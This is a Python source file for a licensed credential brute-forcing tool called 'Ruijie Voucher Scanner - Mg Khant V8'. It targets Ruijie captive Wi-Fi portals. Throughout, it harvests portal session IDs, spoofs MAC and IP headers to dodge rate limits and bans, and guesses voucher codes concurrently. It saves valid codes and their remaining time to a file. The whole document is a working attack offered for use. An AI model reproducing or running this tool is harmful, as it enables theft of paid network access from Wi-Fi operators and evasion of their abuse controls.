#!/usr/bin/env python3
"""
Ruijie Voucher Scanner - Mg Khant V8 Edition
- Contact: @kavin799
- Full Auto-Detect URL
- Custom Dashboard & UI
"""

import os
import sys
import json
import asyncio
import aiohttp
import re
import time
import socket
import requests
import urllib3
import random
import string
from datetime import datetime
from urllib.parse import urlparse, parse_qs, quote

from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.prompt import Prompt
from rich.box import HEAVY, ROUNDED, DOUBLE, SIMPLE

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# 🔐 LICENSE SYSTEM (V7 Base)
# ==========================================
try:
    import license as _license
    HAS_LICENSE = True
except ImportError:
    HAS_LICENSE = False
    _license = None

LICENSE_STATUS = "Unverified"
console = Console()

def check_license():
    global LICENSE_STATUS
    if HAS_LICENSE:
        try:
            valid, msg = _license.check_approval()
            LICENSE_STATUS = msg if valid else "Invalid"
            return valid
        except Exception:
            LICENSE_STATUS = "Error"
            return False
    else:
        console.print("[bold red][!] license.py not found! Please add it to the directory.[/bold red]")
        return False

def activate_license_ui():
    while not check_license():
        clear_screen()
        console.print(Panel(Align.center(Text("🔐 ENTER LICENSE KEY 🔐", style="bold yellow")), border_style="yellow"))
        key = Prompt.ask("  [bright_green]➜ Paste Key[/bright_green]").strip()
        if key and HAS_LICENSE:
            ok, msg = _license.activate(key)
            console.print(f"[bold {'green' if ok else 'red'}]{msg}[/]")
            time.sleep(1.5)
        elif not key:
            pass
        else:
            time.sleep(1)

# ==========================================
# 🚀 MAIN SCANNER SETTINGS
# ==========================================
CONCURRENCY = 20    
TIMEOUT = 5
SID_POOL_MAX = 20  

OUI_POOL = [
    "64:CC:2E", "78:11:DC", "50:8F:4C", "8C:AA:B5", "9C:99:A0",
    "8C:77:12", "34:23:BA", "C0:BD:D1", "BC:14:85", "38:AA:3C",
    "3C:2E:F9", "F0:18:98", "8C:85:90", "BC:92:6B", "D0:81:7A",
    "60:15:C7", "4C:1A:95", "A4:50:46", "5C:1A:6F",
    "3C:AB:8E", "90:2B:34", "4C:74:03", "F4:8B:32",
]

SOFT_BAN_PATTERNS = ["request%20limited", "request limited", "too many", "banned", "blocked", "forbidden", "access denied"]

TIME_LEFT_KEYS = [
    'remainingTime', 'remainTime', 'leftTime', 'timeLeft', 'surplusTime',
    'validTime', 'availTime', 'availableTime', 'duration', 'durationLeft',
    'expireIn', 'expiresIn', 'ttl', 'remaining_seconds', 'remainingSeconds',
    'remain_seconds', 'time_remaining', 'expiredTime', 'expireTime',
    'expiresAt', 'validUntil', 'expiryTime', 'endTime', 'end_time',
]

def _to_human(seconds):
    try: seconds = int(float(seconds))
    except (TypeError, ValueError): return None
    if seconds <= 0: return "expired"
    d, rem = divmod(seconds, 86400)
    h, rem = divmod(rem, 3600)
    m, s = divmod(rem, 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m and not d: parts.append(f"{m}m")
    if s and not d and not h: parts.append(f"{s}s")
    return " ".join(parts) if parts else f"{s}s"

def _parse_hm_unit(text):
    s = str(text).strip().lower()
    total = 0; found = False
    for num, unit in re.findall(r'(\d+(?:\.\d+)?)\s*([dhms])', s):
        try: n = float(num)
        except ValueError: continue
        found = True
        if unit == 'd': total += n * 86400
        elif unit == 'h': total += n * 3600
        elif unit == 'm': total += n * 60
        elif unit == 's': total += n
    if found: return int(total)
    if re.fullmatch(r'\d+', s): return int(s)
    return None

def _find_time_value(obj, depth=0):
    if depth > 5 or obj is None: return None, None
    if isinstance(obj, dict):
        for k in TIME_LEFT_KEYS:
            if k in obj: return k, obj[k]
        for k, v in obj.items():
            if isinstance(k, str) and k.lower() in [x.lower() for x in TIME_LEFT_KEYS]: return k, v
        for v in obj.values():
            fk, fv = _find_time_value(v, depth + 1)
            if fk is not None: return fk, fv
    elif isinstance(obj, list):
        for item in obj:
            fk, fv = _find_time_value(item, depth + 1)
            if fk is not None: return fk, fv
    return None, None

def parse_remaining_time(result):
    if not isinstance(result, dict): return None, None
    key, val = _find_time_value(result)
    if key is None or val is None: return None, None
    raw = val
    if isinstance(val, (int, float)):
        try: n = int(val)
        except (TypeError, ValueError): n = 0
        if n > 10**12: n //= 1000
        if n > 10**9:
            delta = n - int(datetime.now().timestamp())
            return _to_human(delta), raw
        return _to_human(n), raw
    if isinstance(val, str):
        s = val.strip()
        if not s: return None, raw
        sec = _parse_hm_unit(s)
        if sec is not None: return _to_human(sec), raw
    return None, raw

def clear_screen(): os.system('cls' if os.name == 'nt' else 'clear')
def fmt_elapsed(seconds):
    seconds = int(seconds)
    h = seconds // 3600; m = (seconds % 3600) // 60; s = seconds % 60
    return f"{h:02d}:{m:02d}:{s:02d}"

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        parts = ip.split('.'); parts[-1] = '1'
        return '.'.join(parts)
    except Exception: return "192.168.110.1"

def extract_params_from_url(url):
    parsed = urlparse(url); query = parse_qs(parsed.query); params = {}
    mapping = {'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address', 'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num', 'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url', 'chap_id': 'chap_id', 'chap_challenge': 'chap_challenge'}
    for key, mk in mapping.items():
        if key in query: params[mk] = query[key][0]
    if 'RES' in query: params['RES'] = query['RES'][0]
    return params

def auto_detect_portal():
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
    try:
        r = session.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        if "ruijienetworks" in r.url: return r.url
    except Exception: pass
    for gw in [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254"]:
        try:
            res = session.get(f"http://{gw}", timeout=3, allow_redirects=True)
            if "ruijienetworks" in res.url: return res.url
        except Exception: pass
    return None
  class VoucherScanner:
    def __init__(self):
        self.mode = "num"
        self.portal_url = ""
        self.length = 6
        
        self.sid_pool = asyncio.Queue(maxsize=SID_POOL_MAX)
        self.voucher_queue = asyncio.Queue()
        
        self._stop = False
        self._display_active = False
        self._live = None

        self._state = {
            'total': 0, 'checked': 0, 'speed': 0, 'percentage': 0,
            'elapsed': '00:00:00', 'found': [], 'valid': [], 'dead': [],
            'status': 'Init...', 'session': 'None', 'current_code': '----',
            'sid_pool': 0, 'workers': 0
        }

        self.params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": "192.168.110.1",
            "mac": "00:00:00:00:00:00", "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
            "url": "http://connectivitycheck.gstatic.com/generate_204",
            "chap_id": r"\245", "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    def _gen_mac(self):
        oui = random.choice(OUI_POOL)
        return f"{oui}:{random.randint(0x00,0xff):02x}:{random.randint(0x00,0xff):02x}:{random.randint(0x00,0xff):02x}".lower()

    def _gen_ip(self): return f"192.168.110.{random.randint(2, 254)}"

    def _host(self):
        pu = self.portal_url or str(self.params.get("url", ""))
        if "portal-mm" in pu: return "portal-mm-as.ruijienetworks.com"
        return "portal-as.ruijienetworks.com"

    def apply_params_from_url(self, url):
        self.portal_url = url
        for k, v in extract_params_from_url(url).items():
            if k in self.params: self.params[k] = v

    def generate_voucher(self):
        if self.mode == "num": return str(random.randint(0, 10**self.length - 1)).zfill(self.length)
        elif self.mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=self.length))
        elif self.mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=self.length))
        return "0" * self.length

    def make_layout(self):
        s = self._state
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=5),
            Layout(name="stats", size=5),
            Layout(name="body", ratio=1),
            Layout(name="hits", ratio=1)
        )
        
        logo = Text()
        logo.append("🔥 Mg Khant V8 🔥\n", style="bold bright_red on black")
        logo.append("@kavin799", style="bold yellow")
        
        layout["header"].update(Panel(Align.center(logo), border_style="bright_blue", box=DOUBLE))

        rate = len(s['found']) / (s['checked'] / 1000) if s['checked'] > 0 else 0
        stats_grid = Table.grid(expand=True)
        for _ in range(4): stats_grid.add_column(justify="center", ratio=1)
        
        stats_grid.add_row(
            f"[bold green]Code[/]\n{s['current_code']}",
            f"[bold cyan]Checked[/]\n{s['checked']:,} / {s['total']:,}",
            f"[bold yellow]Speed[/]\n{s['speed']:,}/min",
            f"[bold magenta]Found[/]\n{len(s['found'])} [dim]({rate:.2f}/k)[/dim]"
        )
        layout["stats"].update(Panel(stats_grid, border_style="bright_cyan", box=ROUNDED))

        bar_len = 30
        filled = int(bar_len * (s['percentage'] / 100))
        bar = "[bold green]" + "█" * filled + "[/bold green]" + "[dim white]" + "░" * (bar_len - filled) + "[/dim white]"
        
        body_layout = Layout()
        body_layout.split_row(
            Layout(Panel(Align.center(
                f"\n{bar} {s['percentage']:.2f}%\n\n"
                f"[bold cyan]Session:[/] {s['session'][:15] if s['session'] else 'None'}...\n"
                f"[bold yellow]Elapsed:[/] {s['elapsed']} | [bold green]Status:[/] {s['status']}"
            ), title="[bold green]Progress[/]", border_style="green", box=SIMPLE), ratio=1),
            Layout(Panel(Align.center(
                f"SID Pool : [bold magenta]{s['sid_pool']}[/]\n"
                f"Workers  : [bold cyan]{max(0, s['workers'])}[/]\n"
                f"Mode     : [bold yellow]{self.mode.upper()} ({self.length})[/]"
            ), title="[bold yellow]System Info[/]", border_style="yellow", box=SIMPLE), ratio=1)
        )
        layout["body"].update(body_layout)

        hits_table = Table(show_header=True, header_style="bold white on blue", expand=True, box=SIMPLE)
        hits_table.add_column("Type", width=8, justify="center")
        hits_table.add_column("Time", width=10, justify="center")
        hits_table.add_column("Voucher", justify="center")
        hits_table.add_column("Plan / Time Left", justify="center")

        for v, t, _url, tl in s['found']:
            hits_table.add_row("[bold green]FOUND[/bold green]", f"[dim]{t}[/dim]", v, f"[bold green]{tl}[/bold green]" if tl else "[dim]-[/dim]")
        for v, t, tl in s['valid']:
            hits_table.add_row("[green]VALID[/green]", f"[dim]{t}[/dim]", v, f"[green]{tl}[/green]" if tl else "[dim]-[/dim]")
        for v, t, kind in s['dead']:
            if kind == "STA_LIMIT": hits_table.add_row("[yellow]LIMIT[/yellow]", f"[dim]{t}[/dim]", v, "[dim]real[/dim]")
            else: hits_table.add_row("[red]EXPIRED[/red]", f"[dim]{t}[/dim]", v, "[dim]real[/dim]")

        if not s['found'] and not s['valid'] and not s['dead']:
            hits_table.add_row("", "", "[dim]No hits yet...[/dim]", "")

        layout["hits"].update(Panel(
            hits_table, title=f"[bold yellow]HITS DASHBOARD (F: {len(s['found'])} | V: {len(s['valid'])} | D: {len(s['dead'])})[/]", border_style="red", box=SIMPLE
        ))
        return layout

    def _render(self):
        if not self._display_active: return
        try: self._live.update(self.make_layout())
        except Exception: pass

    async def _ui_loop(self):
        while self._display_active:
            self._render()
            await asyncio.sleep(0.1)

    def _record_hit(self, voucher, kind, logon_url="", tl=""):
        clock = datetime.now().strftime("%H:%M:%S")
        try:
            with open("found_ruijie.txt", "a") as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{clock}] [{kind}] {voucher} {logon_url} {tl}\n")
        except: pass
        if kind == "FOUND": self._state['found'].append((voucher, clock, logon_url, tl))
        elif kind == "VALID": self._state['valid'].append((voucher, clock, tl))
        elif kind in ("STA_LIMIT", "EXPIRED"): self._state['dead'].append((voucher, clock, kind))

    async def sid_fetcher(self, session):
        while not self._stop:
            try:
                if self.sid_pool.full():
                    await asyncio.sleep(1)
                    continue

                mac = self._gen_mac()
                ip = self._gen_ip()
                headers = {
                    'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{mac}',
                    'Client-Mac': mac, 'X-Forwarded-For': ip,
                }
                
                temp_params = self.params.copy()
                temp_params['mac'] = mac; temp_params['ip'] = ip
                params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
                url = f"https://{self._host()}/api/auth/wifidog?{params_str}"
                
                sid = None; sign = None; ts = None
                try:
                    async with session.get(url, headers=headers, timeout=4, allow_redirects=False, ssl=False) as resp:
                        loc = resp.headers.get('Location', '')
                        if loc:
                            q = parse_qs(urlparse(loc).query)
                            sid = q.get('sessionId', [None])[0]; sign = q.get('sign', [None])[0]; ts = q.get('timestamp', [None])[0]
                except Exception:
                    pass

                if sid:
                    await self.sid_pool.put({'sid': sid, 'mac': mac, 'ip': ip, 'sign': sign, 'ts': ts, 'used': 0})
                    self._state['sid_pool'] = self.sid_pool.qsize()
            except Exception: pass
            await asyncio.sleep(0.5) # နည်းနည်းပိုစောင့်ပါမယ်

    async def scan_worker(self, session):
        while not self._stop:
            try:
                try: sid_data = await asyncio.wait_for(self.sid_pool.get(), timeout=1.0)
                except asyncio.TimeoutError:
                    self._state['status'] = "Waiting for SID..."; continue

                try: voucher = await asyncio.wait_for(self.voucher_queue.get(), timeout=1.0)
                except asyncio.TimeoutError:
                    await self.sid_pool.put(sid_data); continue

                self._state['workers'] += 1
                self._state['session'] = sid_data['sid']
                
                url = f"https://{self._host()}/api/auth/voucher/?lang=en_US"
                headers = {
                    "content-type": "application/json", "user-agent": "Mozilla/5.0 (Linux; Android 12)",
                    "referer": f"https://{self._host()}/download/static/maccauth/src/index.html?sessionId={sid_data['sid']}",
                    "Client-Mac": sid_data['mac'], "X-Forwarded-For": sid_data['ip'],
                }
                payload = {"accessCode": voucher, "sessionId": sid_data['sid'], "apiVersion": 1}
                if sid_data['sign']: payload["sign"] = sid_data['sign']
                if sid_data['ts']: payload["timestamp"] = sid_data['ts']

                status = 'INVALID'; tl = ""; logon = ""
                
                try:
                    async with session.post(url, json=payload, headers=headers, ssl=False, timeout=TIMEOUT, allow_redirects=True) as resp:
                        text = await resp.text(); final_url = str(resp.url).lower()
                        
                        if resp.status == 429 or any(p in final_url for p in SOFT_BAN_PATTERNS): status = 'DEAD_SID'
                        else:
                            try: result = json.loads(text)
                            except: result = {}
                            msg = str(result.get("message", "")).lower()
                            
                            if "session" in msg and ("expired" in msg or "invalid" in msg or "timed out" in msg): status = 'DEAD_SID'
                            elif any(p in msg for p in SOFT_BAN_PATTERNS): status = 'DEAD_SID'
                            elif "sta limit" in msg or "station limit" in msg: status = 'STA_LIMIT'
                            elif "expired" in msg: status = 'EXPIRED'
                            else:
                                success = False
                                if isinstance(result, dict):
                                    if result.get("success") is True: success = True
                                    if not success and isinstance(result.get("result"), dict):
                                        logon = result["result"].get("logonUrl") or result["result"].get("logon_url")
                                        if logon: success = True
                                    if not success and str(result.get("result")) == "0": success = True
                                    if not success and result.get("error") is None and "result" in result:
                                        if result.get("result") not in (None, False): success = True
                                if not success:
                                    low = text.lower()
                                    if '"result":0' in text or '"error":null' in low or '"success":true' in low: success = True
                                
                                if success:
                                    status = 'FOUND' if logon else 'VALID'
                                    tl = parse_remaining_time(result)[0] or ""
                                elif any(k in msg for k in ("authentication failed", "incorrect", "invalid code", "not found", "wrong")): status = 'INVALID'
                                else: status = 'INVALID'
                except Exception: status = 'DEAD_SID'

                self._state['checked'] += 1
                self._state['current_code'] = voucher
                
                if status in ('DEAD_SID', 'INVALID'):
                    if status == 'INVALID':
                        sid_data['used'] += 1
                        if sid_data['used'] < 10: await self.sid_pool.put(sid_data)
                else:
                    if not self.sid_pool.full(): await self.sid_pool.put(sid_data)
                    self._record_hit(voucher, status, logon, tl)

                if not self._stop: await self.voucher_queue.put(self.generate_voucher())
                    
            except asyncio.CancelledError: break
            except Exception: pass
            finally:
                if self._state['workers'] > 0:
                    self._state['workers'] -= 1
                self._state['sid_pool'] = self.sid_pool.qsize()

    async def run(self, session, total_codes):
        self._state['total'] = total_codes
        self._state['status'] = "Starting Engine..."
        
        for _ in range(CONCURRENCY * 2):
            self.voucher_queue.put_nowait(self.generate_voucher())

        self._display_active = True
        self._live = Live(self.make_layout(), refresh_per_second=10, screen=True)
        self._live.start()
        ui_task = asyncio.create_task(self._ui_loop())
        
        sid_tasks = [asyncio.create_task(self.sid_fetcher(session)) for _ in range(5)]
        scan_tasks = [asyncio.create_task(self.scan_worker(session)) for _ in range(CONCURRENCY)]

        start_time = time.time()
        while self._state['checked'] < total_codes and not self._stop:
            elapsed = time.time() - start_time
            self._state['speed'] = int(self._state['checked'] / elapsed * 60) if elapsed > 0 else 0
            self._state['percentage'] = (self._state['checked'] / total_codes) * 100
            self._state['elapsed'] = fmt_elapsed(elapsed)
            await asyncio.sleep(0.5)

        self._stop = True
        for t in sid_tasks + scan_tasks: t.cancel()
        self._display_active = False
        ui_task.cancel()
        self._live.stop()
        console.print(f"\n[bold green]COMPLETED: {self._state['checked']} codes in {self._state['elapsed']}[/bold green]")


async def main():
    clear_screen()
    if not check_license():
        activate_license_ui()
        if not check_license(): return

    logo_main = Text()
    logo_main.append("🔥 Mg Khant V8 🔥\n", style="bold bright_red on black")
    logo_main.append("@kavin799\n", style="bold yellow")
    logo_main.append(f"License Status: {LICENSE_STATUS}", style="italic green")
    
    console.print(Panel(Align.center(logo_main), border_style="bright_blue", box=DOUBLE))

    console.print("\n")
    console.print(Panel(
        Align.center(
            Text("⚠️ SYSTEM SECURITY PROTOCOL ⚠️\n\n", style="bold white on red") +
            Text("LICENSE VERIFIED SUCCESSFULLY\n", style="bold green") +
            Text("1. TURN OFF MOBILE DATA (4G/5G) ပိတ်ပါ\n", style="bold yellow") +
            Text("2. DISCONNECT WI-FI INTERNET (Wi-Fi ကို Router နဲ့ပဲ ချိတ်ထားပါ)\n", style="bold yellow") +
            Text("\nPRESS [ENTER] TO IGNITE THE ENGINE 🚀\n", style="bold cyan")
        ),
        border_style="red", box=HEAVY, padding=(1, 2)
    ))
    input() 

    scanner = VoucherScanner()
    console.print("[yellow][*][/yellow] Auto-Detecting Portal URL...")
    portal_url = auto_detect_portal()

    if portal_url:
        scanner.apply_params_from_url(portal_url)
        console.print("[bold green][+][/bold green] URL fetched successfully!")
        time.sleep(1)
    else:
        console.print("[bold yellow][!][/bold yellow] Portal not found. Using Default Parameters...")
        time.sleep(1.5)

    async with aiohttp.ClientSession() as session:
        console.print(Panel(Text("Choose Scan Type:\n  1. NUM (0-9)\n  2. ENG (a-z)\n  3. MIX (a-z + 0-9)", style="cyan"), border_style="cyan", box=HEAVY))
        scan_type = input("[yellow]>> [/yellow]").strip()
        scanner.mode = {"1": "num", "2": "eng", "3": "mix"}.get(scan_type, "num")

        lc = input("[yellow]>> Voucher length (6/7/8) [6]: [/yellow]").strip()
        scanner.length = int(lc) if lc in ('7', '8') else 6
        
        total = 100000 if scanner.length == 6 else (500000 if scanner.length == 7 else 1000000)
        await scanner.run(session, total)

    console.print(Panel(Align.center(Text("Done!", style="bold green")), border_style="cyan", box=HEAVY))
    input("[blue][*][/blue] Press Enter to exit...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
